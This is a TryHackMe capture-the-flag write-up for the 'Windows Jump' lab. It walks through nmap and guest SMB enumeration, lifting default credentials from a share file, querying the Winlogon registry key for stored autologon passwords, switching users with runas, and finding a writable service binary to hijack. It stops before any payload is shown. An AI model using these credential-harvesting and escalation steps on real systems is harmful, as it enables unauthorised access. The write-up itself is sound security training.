## Windows Jump — Tryhackme Writeup

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Windows%20Jump/Images/jump.png)

**Room Description**: Use privilege escalation knowledge to jump from a guest user to SYSTEM.

**Room Link**: [Windows Jump](https://tryhackme.com/room/windowsjump)

> A routine vulnerability scan flagged a Windows machine on the internal network; nothing alarming on the surface, just a standard workstation left behind after a round of layoffs. IT never cleaned it up properly. Your job is to find out how badly. Your objective is to escalate from guest access all the way through:  

> guest->thmuser->notadmin->svcadmin->SYSTEM


---

#### Objectives:
 - What are the contents of flag1.txt?
 - What are the contents of flag2.txt?
 - What are the contents of flag3.txt?
 - What are the contents of flag4.txt?

---

> Add the target to hosts:

```zsh
sudo echo -e '10.129.147.245 windows.thm' | sudo tee -a /etc/hosts
```

---

## Enum & Recon

```zsh
nmap -Pn -T4 -p- 10.128.140.167

Nmap scan report for windows.thm (10.128.140.167)
Host is up (0.074s latency).
Not shown: 65520 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
7680/tcp  open  pando-pub
47001/tcp open  winrm
```


### SMB Enum

> I use netexec for this phase, however, you can use other tools like `smbclient` to your liking

```zsh
nxc smb windows.thm -u 'guest' -p '' --shares

SMB         10.128.149.247  445    PRIVESC          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRIVESC) (domain:privesc) (signing:False) (SMBv1:None)
SMB         10.128.149.247  445    PRIVESC          [+] privesc\guest: 
SMB         10.128.149.247  445    PRIVESC          [*] Enumerated shares
SMB         10.128.149.247  445    PRIVESC          Share           Permissions     Remark
SMB         10.128.149.247  445    PRIVESC          -----           -----------     ------
SMB         10.128.149.247  445    PRIVESC          ADMIN$                          Remote Admin
SMB         10.128.149.247  445    PRIVESC          C$                              Default share
SMB         10.128.149.247  445    PRIVESC          IPC$            READ            Remote IPC
SMB         10.128.149.247  445    PRIVESC          Public          READ            Public file share
```

```zsh
nxc smb windows.thm -u 'guest' -p '' --share Public --dir --get-file welcome.txt welcome.txt
SMB         10.128.149.247  445    PRIVESC          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRIVESC) (domain:privesc) (signing:False) (SMBv1:None)
SMB         10.128.149.247  445    PRIVESC          [+] privesc\guest: 
SMB         10.128.149.247  445    PRIVESC          Perms    File Size      Date                          File Path                                    
SMB         10.128.149.247  445    PRIVESC          -----    ---------      ----                          ---------                                    
SMB         10.128.149.247  445    PRIVESC          dr--     0              Tue May 19 03:28:35 2026      .                                            
SMB         10.128.149.247  445    PRIVESC          dr--     0              Tue May 19 03:28:35 2026      ..                                           
SMB         10.128.149.247  445    PRIVESC          fr--     177            Tue May 19 03:28:35 2026      welcome.txt                                  
SMB         10.128.149.247  445    PRIVESC          [*] Copying "welcome.txt" to "welcome.txt"
SMB         10.128.149.247  445    PRIVESC          [+] File "welcome.txt" was downloaded to "welcome.txt"
```

> Reading the file, and discovering credentials

```zsh
more welcome.txt 
Welcome to CORP-NET.

New employee default credentials
================================
Username : thmuser
Password : Password1!

Please change your password after first login.
```

---

## Initial Foothold: thmuser

> I used RDP for connection, however, winrm also can be used

```zsh
xfreerdp /v:10.128.149.247 /u:thmuser /p:'Password1!'
```

> Read the first flag:

```Powershell
type C:\Users\thmuser\Desktop\flag1.txt
```

## PrivEsc: Notadmin

> To find the credentials for notadmin, we can query registry records, specifically WinLogon, where sometimes credentials are stored for automatic sign-in's.

```zsh
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Windows%20Jump/Images/Screenshot%20From%202026-09-22%2012-42-05.png)

> And we discover the creds for notadmin. Let's authenticate.

---

## Lateral Movement - notadmin

> I used runas to drop a shell and read the second flag inside "C:\Users\notadmin\Desktop\flag2.txt"

```Powershell
runas /user:notadmin "powershell.exe"
```

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Windows%20Jump/Images/Screenshot%20From%202026-09-23%2010-57-15.png)

> Read the second flag:

```Powershell
type C:\Users\notadmin\Desktop\flag2.txt
```

---

## PrivEsc - svcadmin

> I enumerated running services, and looked for a service running looking suspicious by the user `svcadmin`

```Powershell
wmic service get Name,DisplayName,StartName,PathName | findstr svcadmin
```

> And there was a service under the name of `THMSvc` running. Using `icacls` we can see what permissions our group or user has on the service.

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Windows%20Jump/Images/Screenshot%20From%202026-09-23%2013-28-35.png)


> Looks like we actually have write permissions, leading to `service binary hijack`, where we can override the `srv.exe`, restart the service and execute it under the name of `svcadmin` user.

